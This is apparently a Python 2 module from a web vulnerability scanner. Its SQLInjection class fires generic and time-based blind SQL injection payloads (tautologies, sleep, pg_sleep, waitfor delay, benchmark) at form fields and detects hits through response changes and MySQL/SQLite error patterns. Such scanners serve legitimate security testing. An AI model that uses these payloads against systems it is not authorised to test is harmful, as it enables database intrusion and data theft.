import requests
import socket
import os
import subprocess
from time import strftime
from random import randint,choice
from urllib import quote_plus
from string import uppercase, lowercase
import re

class SQLInjection(object):
	def __init__(self, target):
		self.target = target
		self.url = target['url']
		self.path = target['path']
		self.partial_path = target['scheme'] + "://" + target['domain']
		self.query = target['query']
		self.results = {}
		self.exploit_param = {}
		self.vulnerable = False
		if 'method' in target:
			if target['method']:
				method = target['method'].upper()
			else:
				method = 'POST'
			self.method = method
		else:
			self.method = 'GET'
	
	def get_attacker_ip(self):
		# https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib
		return [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]


	# https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
	def scan(self):
		generic_payloads = self.get_generic_sql()
		blind_payloads = self.get_blind_sql()
		errors = self.get_errors()
		fail_indicators = {"not found","no such","not exist","does not"}
		if self.method == 'POST':
			inputs = self.target['inputs']
			for input in inputs:
				# possible injection point
				if input['type'] == 'text' and 'sqli' in self.path:
					for payload in generic_payloads:
						params = { input['name']: payload }
						old_req = requests.get(self.url)
						req = requests.post(self.url, data=params)
						for ind in fail_indicators:
							if ind not in req.text and old_req.text != req.text:
								self.vulnerable = True
								print '[+] SQL Injection Vulnerability: ' + self.path 
								self.exploit_param = params
								self.add_scan_results()
						
						for (db, regex) in ((db, regex) for db in errors for regex in errors[db]):
							if re.search(regex, req.text, re.I) and not re.search(regex, old_req.text, re.I):
								self.vulnerable = True
								print '[+] SQL Injection Vulnerability (' + db + '): ' + self.path 
								self.exploit_param = params
								self.add_scan_results()
					'''			
					for payload in blind_payloads:
						params = { input['name']: payload }
						old_req = requests.get(self.url)
						req = requests.post(self.url, data=params)
						print "trying: " + str(params)
						for ind in fail_indicators:
							if ind in req.text or old_req.text == req.text:
								continue
						
						for (db, regex) in ((db, regex) for db in errors for regex in errors[db]):
							if re.search(regex, req.text, re.I) and not re.search(regex, old_req.text, re.I):
								self.vulnerable = True
								print '[+] (Blind) sSQL Injection Vulnerability (' + db + '): ' + self.path 
								self.exploit_param = params
								self.add_scan_results()
				'''				
		if self.vulnerable:
			return self.results 
		else:
			return None
			
	def add_scan_results(self):
		domain = self.partial_path
		if domain not in self.results:
			self.results[domain] = []

		result = {}
		result['endpoint'] = self.path
		result['params'] = self.exploit_param
		result['method'] = self.method
		self.results[domain].append(result)
		
	def get_generic_sql(self):
		payload=["OR '1=1", "OR 'SQLi' = 'SQL'+'i'","OR 'SQLi' > 'S'","or 20 > 1","OR 2 between 3 and 1","OR 'SQLi' = N'SQLi'","1 and 1 = 1","1 || 1 = 1","1 && 1 = 1"]
		#sqli2 and sqli3 are variants of sqli1 with an extra single quote at the start and end respectively.
		sqli2 = []
		sqli3 = []
		for sqli in payload:
			sqli2.append("'"+sqli)
			sqli3.append(sqli+"'")
		payload.extend(sqli2)
		payload.extend(sqli3)
		payload = ["\'"]
		payload += ["\\\'"]
		payload += ["||\'"]
		payload += ["1\'1"]
		payload += ["'='"]
		'''
		payload += ["-%s"%(self.rand_time())]
		payload += ["\'%s"%(self.rand_time())]
		payload += ["%s\'"%(self.rand_string(10))]
		payload += ["\\\"%s"%(self.rand_string(10))]
		payload += ["%s=\'%s"%(self.rand_time(),self.rand_time())]
		payload += ["))\'+OR+%s=%s"%(self.rand_time(),self.rand_time())]
		payload += ["))) AND %s=%s"%(self.rand_time(),self.rand_time())]
		payload += ["; OR \'%s\'=\'%s\'"%(self.rand_time(),self.rand_time())]
		payload += ["\'OR \'))%s=%s --"%(self.rand_time(),self.rand_time())]
		payload += ["\'AND \')))%s=%s --#"%(self.rand_time(),self.rand_time())]
		payload += [" %s 1=1 --"%(self.rand_string(20))]
		payload += [" or sleep(%s)=\'"%(self.rand_time())]
		payload += ["%s' AND username IS NULL; --"%(self.rand_string(10))]
		payload += ["\") or pg_sleep(%s)--"%(self.rand_time())]
		payload += ["; exec (\'sel\' + \'ect us\' + \'er\')"]
		'''
		return payload
	
	def get_blind_sql(self):
		payload = [" AND %s=%s"%(self.rand_time(),self.rand_time())]
		payload += [" OR %s=%s"%(self.rand_time(),self.rand_time())]
		payload += [") AND %s=%s"%(self.rand_time(),self.rand_time())]
		payload += [")) AND %s=%s"%(self.rand_time(),self.rand_time())]
		payload += ["))) AND %s=%s"%(self.rand_time(),self.rand_time())]
		payload += [") OR %s=%s"%(self.rand_time(),self.rand_time())]
		payload += [")) OR %s=%s"%(self.rand_time(),self.rand_time())]
		payload += ["))) OR %s=%s"%(self.rand_time(),self.rand_time())]
		payload += ["sleep(%s)#"%(self.rand_time())]
		payload += ["\" or sleep(%s)#"%(self.rand_time())]
		payload += ["\' or sleep(%s)#"%(self.rand_time())]
		payload += ["\' or sleep(%s)=\'"%(self.rand_time())]
		payload += ["1) or sleep(%s)#"%(self.rand_time())]
		payload += ["\')) or sleep(%s)=\'"%(self.rand_time())]
		payload += [";waitfor delay \'0:0:%s\'--"%(self.rand_time())]
		payload += ["\"));waitfor delay \'0:0:%s\'--"%(self.rand_time())]
		payload += ["1 or benchmark(10000000,MD5(1))#"]
		payload += ["')) or benchmark(10000000,MD5(1))#"]
		payload += ["\')) or pg_sleep(%s)--"%(self.rand_time())]
		payload += [") AND %s=%s AND (%s=%s"%(self.rand_time(),self.rand_time(),self.rand_time(),self.rand_time())]
		payload += [") AND %s=%s AND (8533=8533"%(self.rand_time(),self.rand_time())]
		payload += ["\') AND %s=%s AND (\'%s\'=\'%s"%(self.rand_time(),self.rand_time(),self.rand_string(5),self.rand_string(5))]
		payload += ["\' OR NOT %s=%s-- %s"%(self.rand_time(),self.rand_time(),self.rand_string(5))]
		payload += ["\' OR NOT %s=   %s-- %s"%(self.rand_time(),self.rand_time(),self.rand_string(5))]
		payload += ["\' OR NOT (%s)=%s-- %s"%(self.rand_time(),self.rand_time(),self.rand_string(5))]
		
		return payload
	
	def get_errors(self):
		db_errors = {                                                                     # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
	}
		return db_errors
	def rand_time(self):
		return randint(0,int(strftime('%y%m%d')))
	
	def rand_string(self,n):
		return "".join([choice(uppercase+lowercase) for _ in xrange(0,int(n))])
		
	def generate_exploit(self, endpoint):
		pass
